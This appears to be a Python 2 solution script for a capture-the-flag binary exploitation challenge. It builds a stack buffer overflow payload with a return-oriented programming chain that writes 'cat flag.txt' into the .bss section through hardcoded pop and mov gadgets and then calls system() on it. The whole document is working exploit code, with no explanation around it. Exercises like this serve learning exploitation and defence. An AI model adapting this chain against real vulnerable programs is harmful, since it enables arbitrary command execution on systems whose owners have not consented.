import struct 

def conv(x): 
    return struct.pack('<Q', x) 

pop_gadget = 0x400890 #pop r14, pop r15, ret 
mov_gadget = 0x400820 #mov [r14], r15; ret 
bss_location = 0x0601060 
system_plt = 0x4005e0 
pop_rdi = 0x400893  

def write432(data, loc): 
    buf =  conv(pop_gadget) #fill the registers 
    buf += conv(loc) 
    buf += conv(data) 
    buf += conv(mov_gadget) #we'll return here 
    return buf  

def write(string, start): 
    buf = '' 
    chunks = [string[i:i+8] for i in range(0, len(string), 8)] 
    for x in range(len(chunks)): 
        address = start+x*8 
        buf += write432(struct.unpack('<Q',chunks[x])[0], address) 
    return buf 

buf = 'A'*40 
buf += write('cat flag.txt'+'\x00'*4,bss_location) 
buf += conv(pop_rdi) 
buf += conv(bss_location) 
buf += conv(system_plt) 

print buf 
